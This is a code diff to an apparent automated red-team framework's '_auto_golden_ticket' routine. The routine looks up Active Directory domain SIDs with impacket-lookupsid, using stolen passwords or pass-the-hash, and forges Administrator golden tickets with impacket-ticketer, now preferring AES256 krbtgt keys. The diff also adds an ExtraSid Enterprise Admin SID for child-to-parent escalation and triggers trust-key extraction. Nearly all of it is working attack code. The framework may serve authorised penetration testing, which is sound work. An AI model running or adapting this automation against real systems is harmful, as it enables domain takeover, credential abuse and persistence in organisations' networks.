@@ -3288,6 +3288,10 @@ async def _auto_golden_ticket(
                     for d in redis_da_domains:
                         if d.lower() not in [x.lower() for x in state.domain_admin_domains]:
                             state.domain_admin_domains.append(d.lower())
+                    # Merge Redis domain_sids into in-memory state
+                    # This allows inject-domain-sid CLI command to work for testing
+                    redis_domain_sids = await backend.get_domain_sids()
+                    state.domain_sids.update(redis_domain_sids)
                 except Exception as sync_err:
                     logger.debug(f"🎫 Auto-golden-ticket: Redis sync error (non-fatal): {sync_err}")
 
@@ -3331,60 +3335,82 @@ async def _auto_golden_ticket(
                     "attempting to generate golden ticket"
                 )
 
-                # Need a credential or hash to run lookupsid
-                # Priority: same-domain password > ANY password > same-domain hash > any hash
-                # Password credentials are more reliable than hashes because hash domains
-                # can be incorrectly assigned due to hostname/state sync race conditions.
-                # Cross-domain password auth works via trust relationships.
+                # FIRST check if we have a cached domain SID (from secretsdump or manual injection)
+                # This allows golden ticket generation without needing credentials for lookupsid
+                # Reload domain_sids from Redis in case they were injected externally
+                if dispatcher._task_queue and dispatcher._task_queue.redis:
+                    try:
+                        from ares.core.state_backend import RedisStateBackend
+
+                        backend = RedisStateBackend(
+                            dispatcher._task_queue.redis, state.operation_id
+                        )
+                        redis_domain_sids = await backend.get_domain_sids()
+                        state.domain_sids.update(redis_domain_sids)
+                    except Exception as e:
+                        logger.debug(f"🎫 Auto-golden-ticket: Failed to reload domain_sids: {e}")
+                domain_sid = state.domain_sids.get(domain.lower())
                 cred = None
                 auth_hash = None
 
-                # 1. Try to find password credential for this domain first (most reliable)
-                for c in state.all_credentials:
-                    if c.password and c.domain and c.domain.lower() == domain.lower():
-                        cred = c
-                        break
+                if domain_sid:
+                    logger.info(
+                        f"🎫 Auto-golden-ticket: Using cached domain SID for {domain}: {domain_sid}"
+                    )
+                    # Skip credential lookup - we don't need lookupsid
+                else:
+                    # No cached SID - need credentials to run lookupsid
+                    # Priority: same-domain password > ANY password > same-domain hash > any hash
+                    # Password credentials are more reliable than hashes because hash domains
+                    # can be incorrectly assigned due to hostname/state sync race conditions.
+                    # Cross-domain password auth works via trust relationships.
 
-                # 2. Try ANY password credential (cross-domain auth works via trust)
-                if not cred:
+                    # 1. Try to find password credential for this domain first (most reliable)
                     for c in state.all_credentials:
-                        if c.password:
+                        if c.password and c.domain and c.domain.lower() == domain.lower():
                             cred = c
                             break
 
-                # 3. Try same-domain NTLM hash (PTH) - less reliable, domain may be wrong
-                if not cred:
-                    for h in state.all_hashes:
-                        if h.hash_type.lower() != "ntlm":
-                            continue
-                        # Skip krbtgt and machine accounts - use regular user accounts
-                        if h.username.lower() == "krbtgt" or h.username.endswith("$"):
-                            continue
-                        # Same domain only
-                        if h.domain and h.domain.lower() == domain.lower():
+                    # 2. Try ANY password credential (cross-domain auth works via trust)
+                    if not cred:
+                        for c in state.all_credentials:
+                            if c.password:
+                                cred = c
+                                break
+
+                    # 3. Try same-domain NTLM hash (PTH) - less reliable, domain may be wrong
+                    if not cred:
+                        for h in state.all_hashes:
+                            if h.hash_type.lower() != "ntlm":
+                                continue
+                            # Skip krbtgt and machine accounts - use regular user accounts
+                            if h.username.lower() == "krbtgt" or h.username.endswith("$"):
+                                continue
+                            # Same domain only
+                            if h.domain and h.domain.lower() == domain.lower():
+                                auth_hash = h
+                                logger.debug(
+                                    f"🎫 Auto-golden-ticket: Using same-domain hash for {domain}: "
+                                    f"{h.domain}\\{h.username}"
+                                )
+                                break
+
+                    # 4. Try any NTLM hash (cross-domain PTH as last resort)
+                    if not cred and not auth_hash:
+                        for h in state.all_hashes:
+                            if h.hash_type.lower() != "ntlm":
+                                continue
+                            if h.username.lower() == "krbtgt" or h.username.endswith("$"):
+                                continue
                             auth_hash = h
-                            logger.debug(
-                                f"🎫 Auto-golden-ticket: Using same-domain hash for {domain}: "
-                                f"{h.domain}\\{h.username}"
-                            )
                             break
 
-                # 4. Try any NTLM hash (cross-domain PTH as last resort)
-                if not cred and not auth_hash:
-                    for h in state.all_hashes:
-                        if h.hash_type.lower() != "ntlm":
-                            continue
-                        if h.username.lower() == "krbtgt" or h.username.endswith("$"):
-                            continue
-                        auth_hash = h
-                        break
-
-                if not cred and not auth_hash:
-                    logger.warning(
-                        f"🎫 Auto-golden-ticket: No password or hash credential available for SID lookup "
-                        f"in {domain}, skipping golden ticket (will retry)"
-                    )
-                    continue
+                    if not cred and not auth_hash:
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: No password or hash credential available for SID lookup "
+                            f"in {domain}, skipping golden ticket (will retry)"
+                        )
+                        continue
 
                 # Find DC IP for this domain using dispatcher's robust lookup
                 # This handles child domains, forest DCs, DNS SRV, etc.
@@ -3406,128 +3432,135 @@ async def _auto_golden_ticket(
                     continue
 
                 # Run lookupsid to get domain SID (with retry for transient errors)
+                # Skip if we already have a cached domain SID
                 try:
                     from tenacity import RetryError
 
                     from ares.tools.red.common import run_tool
 
-                    if cred:
-                        # Password-based auth
-                        cmd = [
-                            "impacket-lookupsid",
-                            f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
-                        ]
-                        logger.info(
-                            f"🎫 Auto-golden-ticket: Running lookupsid with password for "
-                            f"{cred.domain}\\{cred.username}"
-                        )
-                    else:
-                        # Hash-based auth (pass-the-hash)
-                        # Format: domain/user@target -hashes LMHASH:NTHASH
-                        # Extract just the NT hash if full LM:NT format
-                        # Note: auth_hash is guaranteed non-None here because we checked
-                        # `if not cred and not auth_hash: continue` above
-                        assert auth_hash is not None  # noqa: S101
-                        nt_hash = auth_hash.hash_value
-                        if ":" in nt_hash:
-                            nt_hash = nt_hash.split(":")[-1]
-                        cmd = [
-                            "impacket-lookupsid",
-                            f"{auth_hash.domain}/{auth_hash.username}@{dc_ip}",
-                            "-hashes",
-                            f":{nt_hash}",  # Empty LM hash, just NT hash
-                        ]
-                        logger.info(
-                            f"🎫 Auto-golden-ticket: Running lookupsid with hash (PTH) for "
-                            f"{auth_hash.domain}\\{auth_hash.username}"
-                        )
+                    sid_match = None  # Initialize for case where we skip lookupsid
+                    output = ""  # Initialize for error handling
 
-                    # Use retry wrapper for lookupsid - handles Redis timeouts gracefully
-                    try:
-                        stdout, stderr, _ = _run_lookupsid_with_retry(cmd, timeout_seconds=60)
-                    except (TransientToolError, RetryError) as e:
-                        # All retries exhausted due to transient errors (Redis timeout, network)
-                        # Don't mark as permanently failed - allow retry on next check interval
-                        logger.warning(
-                            f"🎫 Auto-golden-ticket: Transient errors for {domain} after retries, "
-                            f"will retry next interval: {e}"
-                        )
-                        # Don't add to processed_domains - allow retry on next iteration
-                        continue
-
-                    output = stdout + "\n" + (stderr or "")
-
-                    # Debug log to see actual lookupsid output
-                    output_preview = output[:300].replace("\n", "\\n") if output else "<empty>"
-                    logger.debug(
-                        f"🎫 Auto-golden-ticket: lookupsid output for {domain}: {output_preview}"
-                    )
-
-                    # Parse domain SID from output
-                    sid_match = re.search(r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output)
-
-                    # If auth failed (LOGON_FAILURE or ACCOUNT_LOCKED_OUT), try other credentials
-                    # This handles cases where hash is from wrong domain or account is locked
-                    auth_failed = (
-                        "STATUS_LOGON_FAILURE" in output or "STATUS_ACCOUNT_LOCKED_OUT" in output
-                    )
-                    tried_users = {cred.username.lower()} if cred else set()
-                    if not sid_match and auth_failed:
-                        logger.warning(
-                            f"🎫 Auto-golden-ticket: Auth failed for {domain}, trying other credentials"
-                        )
-                        # Try other password credentials (skip the one that just failed)
-                        for c in state.all_credentials:
-                            if not c.password or c.username.lower() in tried_users:
-                                continue
-                            tried_users.add(c.username.lower())
+                    # Only run lookupsid if we don't already have a cached SID
+                    if not domain_sid:
+                        if cred:
+                            # Password-based auth
                             cmd = [
                                 "impacket-lookupsid",
-                                f"{c.domain}/{c.username}:{c.password}@{dc_ip}",
+                                f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
                             ]
                             logger.info(
-                                f"🎫 Auto-golden-ticket: Retrying lookupsid with "
-                                f"{c.domain}\\{c.username}"
+                                f"🎫 Auto-golden-ticket: Running lookupsid with password for "
+                                f"{cred.domain}\\{cred.username}"
                             )
-                            try:
-                                stdout, stderr, _ = _run_lookupsid_with_retry(
-                                    cmd, timeout_seconds=60
-                                )
-                                output = stdout + "\n" + (stderr or "")
-                                output_preview = (
-                                    output[:300].replace("\n", "\\n") if output else "<empty>"
-                                )
-                                sid_match = re.search(
-                                    r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
-                                )
-                                if sid_match:
-                                    break  # Success! Exit retry loop
-                                # If this cred also failed with auth error, continue to next
-                                if (
-                                    "STATUS_LOGON_FAILURE" in output
-                                    or "STATUS_ACCOUNT_LOCKED_OUT" in output
-                                ):
-                                    logger.warning(
-                                        f"🎫 Auto-golden-ticket: {c.username} also failed, trying next"
-                                    )
-                                    continue
-                            except (TransientToolError, RetryError):
-                                continue  # Try next credential
+                        else:
+                            # Hash-based auth (pass-the-hash)
+                            # Format: domain/user@target -hashes LMHASH:NTHASH
+                            # Extract just the NT hash if full LM:NT format
+                            # Note: auth_hash is guaranteed non-None here because we checked
+                            # `if not cred and not auth_hash: continue` above
+                            assert auth_hash is not None  # noqa: S101
+                            nt_hash = auth_hash.hash_value
+                            if ":" in nt_hash:
+                                nt_hash = nt_hash.split(":")[-1]
+                            cmd = [
+                                "impacket-lookupsid",
+                                f"{auth_hash.domain}/{auth_hash.username}@{dc_ip}",
+                                "-hashes",
+                                f":{nt_hash}",  # Empty LM hash, just NT hash
+                            ]
+                            logger.info(
+                                f"🎫 Auto-golden-ticket: Running lookupsid with hash (PTH) for "
+                                f"{auth_hash.domain}\\{auth_hash.username}"
+                            )
 
-                    # First check if we have a cached SID from secretsdump
-                    domain_sid = state.domain_sids.get(domain.lower())
-                    if domain_sid:
-                        logger.info(
-                            f"🎫 Auto-golden-ticket: Using cached domain SID for {domain}: {domain_sid}"
+                        # Use retry wrapper for lookupsid - handles Redis timeouts gracefully
+                        try:
+                            stdout, stderr, _ = _run_lookupsid_with_retry(cmd, timeout_seconds=60)
+                        except (TransientToolError, RetryError) as e:
+                            # All retries exhausted due to transient errors (Redis timeout, network)
+                            # Don't mark as permanently failed - allow retry on next check interval
+                            logger.warning(
+                                f"🎫 Auto-golden-ticket: Transient errors for {domain} after retries, "
+                                f"will retry next interval: {e}"
+                            )
+                            # Don't add to processed_domains - allow retry on next iteration
+                            continue
+
+                        output = stdout + "\n" + (stderr or "")
+
+                        # Debug log to see actual lookupsid output
+                        output_preview = output[:300].replace("\n", "\\n") if output else "<empty>"
+                        logger.debug(
+                            f"🎫 Auto-golden-ticket: lookupsid output for {domain}: {output_preview}"
                         )
-                    elif sid_match:
-                        domain_sid = sid_match.group(1)
-                        state.domain_sids[domain.lower()] = domain_sid
-                        logger.info(
-                            f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}"
+
+                        # Parse domain SID from output
+                        sid_match = re.search(
+                            r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
                         )
-                    else:
-                        # Lookupsid failed - try LDAP fallback
+
+                        # If auth failed (LOGON_FAILURE or ACCOUNT_LOCKED_OUT), try other credentials
+                        # This handles cases where hash is from wrong domain or account is locked
+                        auth_failed = (
+                            "STATUS_LOGON_FAILURE" in output
+                            or "STATUS_ACCOUNT_LOCKED_OUT" in output
+                        )
+                        tried_users = {cred.username.lower()} if cred else set()
+                        if not sid_match and auth_failed:
+                            logger.warning(
+                                f"🎫 Auto-golden-ticket: Auth failed for {domain}, trying other credentials"
+                            )
+                            # Try other password credentials (skip the one that just failed)
+                            for c in state.all_credentials:
+                                if not c.password or c.username.lower() in tried_users:
+                                    continue
+                                tried_users.add(c.username.lower())
+                                cmd = [
+                                    "impacket-lookupsid",
+                                    f"{c.domain}/{c.username}:{c.password}@{dc_ip}",
+                                ]
+                                logger.info(
+                                    f"🎫 Auto-golden-ticket: Retrying lookupsid with "
+                                    f"{c.domain}\\{c.username}"
+                                )
+                                try:
+                                    stdout, stderr, _ = _run_lookupsid_with_retry(
+                                        cmd, timeout_seconds=60
+                                    )
+                                    output = stdout + "\n" + (stderr or "")
+                                    output_preview = (
+                                        output[:300].replace("\n", "\\n") if output else "<empty>"
+                                    )
+                                    sid_match = re.search(
+                                        r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output
+                                    )
+                                    if sid_match:
+                                        break  # Success! Exit retry loop
+                                    # If this cred also failed with auth error, continue to next
+                                    if (
+                                        "STATUS_LOGON_FAILURE" in output
+                                        or "STATUS_ACCOUNT_LOCKED_OUT" in output
+                                    ):
+                                        logger.warning(
+                                            f"🎫 Auto-golden-ticket: {c.username} also failed, trying next"
+                                        )
+                                        continue
+                                except (TransientToolError, RetryError):
+                                    continue  # Try next credential
+
+                        # Use lookupsid result if successful
+                        if sid_match:
+                            domain_sid = sid_match.group(1)
+                            state.domain_sids[domain.lower()] = domain_sid
+                            logger.info(
+                                f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}"
+                            )
+
+                    # If we still don't have domain_sid, try LDAP fallback
+                    # (only if we actually ran lookupsid and it failed)
+                    if not domain_sid and output:
+                        output_preview = output[:300].replace("\n", "\\n") if output else "<empty>"
                         logger.warning(
                             f"🎫 Auto-golden-ticket: lookupsid failed for {domain}, "
                             f"trying LDAP fallback. Output: {output_preview}"
@@ -3544,25 +3577,25 @@ async def _auto_golden_ticket(
                         except Exception as ldap_err:
                             logger.warning(f"🎫 Auto-golden-ticket: LDAP failed: {ldap_err}")
 
-                        if not domain_sid:
-                            # Both lookupsid and LDAP failed
-                            logger.warning(
-                                f"🎫 Auto-golden-ticket: Could not get SID for {domain} "
-                                f"via lookupsid or LDAP"
-                            )
-                            state.add_golden_ticket(
-                                {
-                                    "domain": domain,
-                                    "ticket_path": None,
-                                    "created_at": datetime.now(timezone.utc).isoformat(),
-                                    "status": "failed_no_sid",
-                                    "error": output[:500]
-                                    if output.strip()
-                                    else "No output from lookupsid",
-                                }
-                            )
-                            processed_domains.add(domain.lower())
-                            continue
+                    # Final check - if we still don't have domain_sid, fail
+                    if not domain_sid:
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: Could not get SID for {domain} "
+                            f"via cache, lookupsid, or LDAP"
+                        )
+                        state.add_golden_ticket(
+                            {
+                                "domain": domain,
+                                "ticket_path": None,
+                                "created_at": datetime.now(timezone.utc).isoformat(),
+                                "status": "failed_no_sid",
+                                "error": output[:500]
+                                if output.strip()
+                                else "No output from lookupsid",
+                            }
+                        )
+                        processed_domains.add(domain.lower())
+                        continue
 
                     # Check if this is a child domain - if so, get parent SID for ExtraSid
                     # Parent-child trusts have NO SID filtering, so we can inject Enterprise Admin SID
@@ -3580,10 +3613,34 @@ async def _auto_golden_ticket(
                         )
 
                     if parent_domain:
-                        # Get parent domain's DC IP
-                        parent_dc_ip = state.domain_controllers.get(parent_domain)
+                        # Get parent domain's DC IP - MUST validate it's actually a parent DC
+                        # The cache may have incorrect mappings (e.g., child DC IP for parent domain
+                        # when operation was started with wrong DC IP)
+                        parent_dc_ip = None
+                        cached_dc_ip = state.domain_controllers.get(parent_domain)
+
+                        if cached_dc_ip:
+                            # Validate the cached IP is actually a parent DC, not a child DC
+                            # by checking the hostname matches parent domain (not child domain)
+                            for host in state.all_hosts:
+                                if (
+                                    host.ip == cached_dc_ip
+                                    and host.is_dc
+                                    and host.hostname
+                                    and host.hostname.lower().endswith(f".{parent_domain}")
+                                    and not host.hostname.lower().endswith(f".{domain.lower()}")
+                                ):
+                                    parent_dc_ip = cached_dc_ip
+                                    break
+
+                            if not parent_dc_ip:
+                                logger.warning(
+                                    f"🎫 Auto-golden-ticket: Cached DC {cached_dc_ip} for {parent_domain} "
+                                    f"is not a valid parent DC (may be child DC), searching for correct DC"
+                                )
+
                         if not parent_dc_ip:
-                            # Try to find parent DC from hosts
+                            # Try to find parent DC from hosts by hostname
                             for host in state.all_hosts:
                                 if (
                                     host.is_dc
@@ -3592,6 +3649,10 @@ async def _auto_golden_ticket(
                                     and not host.hostname.lower().endswith(f".{domain.lower()}")
                                 ):
                                     parent_dc_ip = host.ip
+                                    logger.info(
+                                        f"🎫 Auto-golden-ticket: Found parent DC via hostname: "
+                                        f"{host.hostname} -> {parent_dc_ip}"
+                                    )
                                     break
 
                         # DNS fallback - resolve parent DC via SRV lookup
@@ -3693,24 +3754,49 @@ async def _auto_golden_ticket(
                                 )
 
                     # Generate golden ticket
-                    # Extract just the NT hash if in LM:NT format
-                    krbtgt_nt_hash = hash_obj.hash_value
-                    if ":" in krbtgt_nt_hash:
-                        krbtgt_nt_hash = krbtgt_nt_hash.split(":")[-1]
-
+                    # Prefer AES256 key over NTLM hash for modern Windows (2016+)
+                    # RC4 golden tickets fail with KDC_ERR_TGT_REVOKED on newer DCs
                     ticket_path = "/tmp/Administrator.ccache"  # nosec B108 # noqa: S108
-                    cmd = [
-                        "impacket-ticketer",
-                        "-nthash",
-                        krbtgt_nt_hash,
-                        "-domain-sid",
-                        domain_sid,
-                        "-domain",
-                        domain,
-                        "-user-id",
-                        "500",
-                        "Administrator",
-                    ]
+
+                    if hash_obj.aes_key:
+                        # Use AES256 key (required for Windows 2016+)
+                        logger.info(
+                            f"🎫 Auto-golden-ticket: Using AES256 key for {domain} "
+                            f"(required for modern Windows)"
+                        )
+                        cmd = [
+                            "impacket-ticketer",
+                            "-aesKey",
+                            hash_obj.aes_key,
+                            "-domain-sid",
+                            domain_sid,
+                            "-domain",
+                            domain,
+                            "-user-id",
+                            "500",
+                            "Administrator",
+                        ]
+                    else:
+                        # Fallback to NTLM hash (may fail on Windows 2016+)
+                        krbtgt_nt_hash = hash_obj.hash_value
+                        if ":" in krbtgt_nt_hash:
+                            krbtgt_nt_hash = krbtgt_nt_hash.split(":")[-1]
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: No AES key available for {domain}, "
+                            f"using NTLM hash (may fail on Windows 2016+)"
+                        )
+                        cmd = [
+                            "impacket-ticketer",
+                            "-nthash",
+                            krbtgt_nt_hash,
+                            "-domain-sid",
+                            domain_sid,
+                            "-domain",
+                            domain,
+                            "-user-id",
+                            "500",
+                            "Administrator",
+                        ]
 
                     # Add ExtraSid for parent domain Enterprise Admin if we have parent SID
                     # This enables child-to-parent escalation via SID history injection
@@ -3873,6 +3959,27 @@ async def _auto_golden_ticket(
                                         )
                                         state.add_hash(parent_hash_obj)
 
+                                        # Mark parent domain as DA (we have Administrator hash)
+                                        state.has_domain_admin = True
+                                        if parent_domain.lower() not in [
+                                            d.lower() for d in state.domain_admin_domains
+                                        ]:
+                                            state.domain_admin_domains.append(parent_domain.lower())
+
+                                        # Trigger trust key extraction now that we have parent DA
+                                        # This extracts ESSOS$ and other trust account hashes
+                                        try:
+                                            await dispatcher._auto_dispatch_trust_key_extraction(
+                                                da_domain=parent_domain,
+                                                da_username="Administrator",
+                                                undominated_forests=state.get_undominated_forests(),
+                                                source_agent="auto_golden_ticket",
+                                            )
+                                        except Exception as trust_err:
+                                            logger.warning(
+                                                f"🎫 Trust extraction dispatch failed: {trust_err}"
+                                            )
+
                                         # Also get parent krbtgt if present
                                         krbtgt_match = re.search(
                                             r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
@@ -3909,11 +4016,11 @@ async def _auto_golden_ticket(
                             "created_at": datetime.now(timezone.utc).isoformat(),
                             "status": "success",
                         }
-                        if parent_sid:
+                        if parent_sid and parent_domain:
                             ticket_info["parent_domain"] = parent_domain
                             ticket_info["parent_sid"] = parent_sid
                             ticket_info["extra_sid"] = f"{parent_sid}-519"
-                            ticket_info["enterprise_admin"] = True
+                            ticket_info["enterprise_admin"] = "true"
                         state.add_golden_ticket(ticket_info)
                         # Update processed_domains to prevent duplicate attempts in this iteration
                         processed_domains.add(domain.lower())
